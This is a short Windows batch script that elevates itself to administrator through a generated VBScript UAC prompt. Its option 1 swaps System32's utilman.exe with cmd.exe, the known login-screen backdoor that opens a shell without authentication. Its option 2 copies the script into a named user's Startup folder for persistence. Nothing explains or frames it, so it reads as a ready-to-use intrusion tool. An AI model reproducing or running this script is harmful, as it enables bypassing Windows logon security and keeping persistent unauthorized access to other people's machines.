cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )


set /p choice=Please enter your choice (1,2):

if /I "%choice%" EQU "1" goto o1
if /I "%choice%" EQU "2" goto o2
goto eof

:o1
ren "C:\Windows\System32\utilman.exe" "cmd2.exe"
ren "C:\Windows\System32\cmd.exe" "utilman.exe"
ren "C:\Windows\System32\cmd2.exe" "cmd.exe"
pause
goto eof

:o2
if not exist "C:\Users\siddk\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup%~nx0" (
  copy "%~f0" "C:\Users\siddk\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
)
pause
goto eof
